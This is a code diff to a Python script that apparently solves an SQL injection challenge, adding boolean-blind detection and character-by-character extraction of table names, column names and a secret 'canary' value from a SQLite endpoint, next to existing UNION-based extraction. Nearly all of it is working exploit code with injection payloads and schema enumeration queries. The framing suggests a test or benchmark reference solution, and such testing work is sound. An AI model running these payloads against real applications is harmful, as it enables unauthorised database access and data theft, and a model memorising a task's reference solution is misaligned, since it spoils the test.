@@ -66,14 +66,62 @@ def _union(mid: str, from_clause: str = "") -> str:
     return f"' UNION SELECT 1, {mid}, 1{tail}-- -"
 
 
-def find_injectable() -> tuple[str, str] | None:
-    """Return (endpoint, param) whose response echoes our marker back."""
-    payload = _union(f"'{MARKER}'")
+NAME_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_"
+HEX_CHARSET = "0123456789abcdef"
+
+
+def find_injectable() -> tuple[str, str, str] | None:
+    """Return (endpoint, param, variant) for the injectable endpoint.
+
+    Tries the union technique first (does our marker echo back in a row?), then
+    the boolean-blind technique (does a true condition differ from a false one?).
+    """
+    union_payload = _union(f"'{MARKER}'")
     for endpoint in CANDIDATE_ENDPOINTS:
         for param in CANDIDATE_PARAMS:
-            if MARKER in _get(endpoint, param, payload):
-                return endpoint, param
+            if MARKER in _get(endpoint, param, union_payload):
+                return endpoint, param, "union"
+            if _is_boolean_injectable(endpoint, param):
+                return endpoint, param, "boolean"
     return None
+
+
+# --- boolean-blind helpers ---------------------------------------------
+
+def _btest(endpoint: str, param: str, condition: str) -> bool:
+    """Ask the target a yes/no question via a boolean-blind OR injection: the
+    response's `found` reflects `condition`."""
+    payload = f"zzz' OR ({condition})-- -"
+    body = _get(endpoint, param, payload)
+    try:
+        return bool(json.loads(body).get("found"))
+    except (json.JSONDecodeError, AttributeError):
+        return False
+
+
+def _is_boolean_injectable(endpoint: str, param: str) -> bool:
+    """Injectable via boolean blind iff a true condition yields found=true and a
+    false one yields found=false."""
+    return _btest(endpoint, param, "1=1") and not _btest(endpoint, param, "1=2")
+
+
+def _blind_string(endpoint: str, param: str, subquery: str, charset: str,
+                  max_len: int = 64) -> str:
+    """Reconstruct the string value of `subquery` one character at a time using
+    only true/false answers."""
+    out = ""
+    for i in range(1, max_len + 1):
+        if not _btest(endpoint, param, f"length(({subquery})) >= {i}"):
+            break
+        found = None
+        for c in charset:
+            if _btest(endpoint, param, f"substr(({subquery}),{i},1)='{c}'"):
+                found = c
+                break
+        if found is None:
+            break
+        out += found
+    return out
 
 
 def _extract_column(endpoint: str, param: str, mid: str, from_clause: str = "") -> list[str]:
@@ -102,8 +150,46 @@ def solve() -> dict | None:
     hit = find_injectable()
     if not hit:
         return None
-    endpoint, param = hit
+    endpoint, param, variant = hit
+    if variant == "boolean":
+        return _solve_boolean(endpoint, param)
+    return _solve_union(endpoint, param)
 
+
+def _solve_boolean(endpoint: str, param: str) -> dict | None:
+    """Blind extraction: find the secret table and column, then the canary,
+    all through true/false answers."""
+    table = _blind_string(
+        endpoint, param,
+        "SELECT name FROM sqlite_master WHERE type='table' AND name!='products' LIMIT 1",
+        NAME_CHARSET,
+    )
+    if not table:
+        return None
+    column = _blind_string(
+        endpoint, param,
+        f"SELECT name FROM pragma_table_info('{table}') WHERE name!='id' LIMIT 1",
+        NAME_CHARSET,
+    )
+    if not column:
+        return None
+    canary = _blind_string(
+        endpoint, param, f'SELECT "{column}" FROM "{table}" LIMIT 1', HEX_CHARSET,
+    )
+    if not canary:
+        return None
+    return {
+        "endpoint": endpoint,
+        "parameter": param,
+        "injection_type": "sql_injection",
+        "payload": f"zzz' OR (substr((SELECT \"{column}\" FROM \"{table}\"),1,1)='?')-- -",
+        "severity": "high",
+        "confidence": 0.95,
+        "evidence": {"canary": canary},
+    }
+
+
+def _solve_union(endpoint: str, param: str) -> dict | None:
     # 2. tables -> the secret table is the one that isn't products
     tables = _extract_column(
         endpoint, param, "name", "FROM sqlite_master WHERE type='table'"
